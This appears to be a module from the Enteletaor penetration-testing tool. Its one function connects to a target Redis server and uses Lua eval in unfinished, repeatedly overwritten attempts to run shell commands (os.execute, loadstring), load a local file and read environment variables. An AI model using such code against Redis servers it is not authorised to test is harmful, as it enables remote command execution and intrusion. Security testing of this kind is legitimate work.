# -*- coding: utf-8 -*-
#
# Enteletaor - https://github.com/cr0hn/enteletaor
#
# Redistribution and use in source and binary forms, with or without modification, are permitted provided that the
# following conditions are met:
#
# 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the
# following disclaimer.
#
# 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the
# following disclaimer in the documentation and/or other materials provided with the distribution.
#
# 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote
# products derived from this software without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES,
# INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
# DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
# SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
# SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
# WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
# OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
#

import six
import redis
import logging

log = logging.getLogger()


# ----------------------------------------------------------------------
def action_redis_shell(config):
	"""
	Dump all redis information
	"""
	log.warning("  - Trying to connect with redis server...")

	# Connection with redis
	con = redis.StrictRedis(host=config.target, port=config.port, db=config.db)

	# LUA script
	lua_script = '''local value = os.execute(ls)
	return value'''
	# lua_script = '''
	# eval "os.execute(ls)"
	# '''

	# script = con.register_script(lua_script)
	# con.eval('os.execute("ls")', None)
	# script = con.script_load(lua_script)


	lua_script = "print('/home/parallels/hola.txt')"
	lua_script = 'string.find("hello Lua users", "Lua")'
	lua_script = "dofile('/home/parallels/hola.txt')"
	lua_script = """local code = [[
		os.execute("ls")
	]]
	local h = loadstring(code)
	return h()"""
	# lua_script = """
	# local x = "Hello World"
	# local code = string.dump(function() print(x) end)
	# local hi = loadstring(code)
	# return hi()
	# """
	lua_script="""
	return os.getenv"USER"
	"""
	print(con.eval(lua_script, 0))

	# c = con.script_load(lua_script)
	# con.evalsha(c, 0)